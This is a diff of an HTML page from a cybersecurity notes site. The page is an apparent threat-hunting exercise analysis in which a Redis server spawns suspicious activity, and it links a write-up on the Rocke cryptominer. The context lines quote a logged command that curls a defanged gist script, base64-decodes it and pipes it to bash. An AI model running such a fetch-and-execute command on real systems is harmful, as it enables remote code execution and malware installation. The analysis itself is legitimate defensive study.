@@ -10,20 +10,10 @@
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
 </head>
 <body>
-<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
-<div class="layout">
-<aside class="sidebar" id="sidebar">
-  <a class="brand" href="../../../index.html">
-    <span class="brand-flag">&#127988;</span>
-    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
-  </a>
-  <nav class="nav" id="nav-root" data-current="other/exercises/red-canary/scenario-3-analysis.html" data-root="../../.."></nav>
-</aside>
 <main class="content">
   <article class="doc">
   <div class="breadcrumb"><a href="../../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../../index.html">Other</a> &rsaquo; <a href="../index.html">Exercises</a> &rsaquo; <a href="index.html">Red Canary</a></div>
 <h1 id="title">Scenario #3 Analysis</h1>
-
 <pre><code>#Redis server as parent process
 Parent Process: redis-server
 #https://www.virustotal.com/gui/file/609aa5f366aee242bc237fbafad20214e9c4f1d2d721c87859ba3ae3555873b8
@@ -33,7 +23,7 @@ Parent MD5: 9494cfd0f8c829acd9b1a88f9a0fd2ec
 Process CLI: 
 bash -c “curl  hxxps://gist.githubusercontent[.]com/ForensicITGuy/165c3de5c3f23168517820b12311fd35/raw/c6e44a7e946fba1bb5eaa0d570aeb98727b8cdc8/totes-evil.sh | base64 -d | bash”
 Network connection count: 1</code></pre>
-<p><a href="https://redcanary.com/blog/threat-detection/rocke-cryptominer/" target="_blank" rel="noopener">https://redcanary.com/blog/threat-detection/rocke-cryptominer/</a></p>
+<a class="bookmark" href="https://redcanary.com/blog/threat-detection/rocke-cryptominer/" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">Threat Hunting in Linux For Rocke Cryptocurrency Mining Malware</div><div class="bm-desc">Rocke is a threat actor known for mining cryptocurrency on Linux machines, but it also persists, disables security software, moves laterally, and more.</div><div class="bm-url"><img class="bm-icon" src="../../../assets/bookmarks/redcanary-com-blog-threat-detection-rocke-cryptominer-icon.ico" alt="" loading="lazy">https://redcanary.com/blog/threat-detection/rocke-cryptominer/</div></div><div class="bm-img"><img src="../../../assets/bookmarks/redcanary-com-blog-threat-detection-rocke-cryptominer.jpg" alt="" loading="lazy"></div></a>
 <p>Sandbox check for the script</p>
 <p class="figure"><a class="img-link" href="scenario-3-analysis/image.png"><img src="scenario-3-analysis/image.png" alt="image.png" loading="lazy"></a></p>
 <p><a href="../../../huntress/2024-huntress-ctf/2024-10-01-base64by32-scripting.html">Cyberchef</a> decode</p>
@@ -245,14 +235,7 @@ a
 b
 c</code></pre>
   </article>
-  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+  <footer class="foot"><a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
 </main>
-</div>
-<script src="../../../assets/nav.js" defer></script>
-<script>
-document.getElementById('menu-toggle').addEventListener('click',function(){
-  document.getElementById('sidebar').classList.toggle('open');
-});
-</script>
 </body>
 </html>
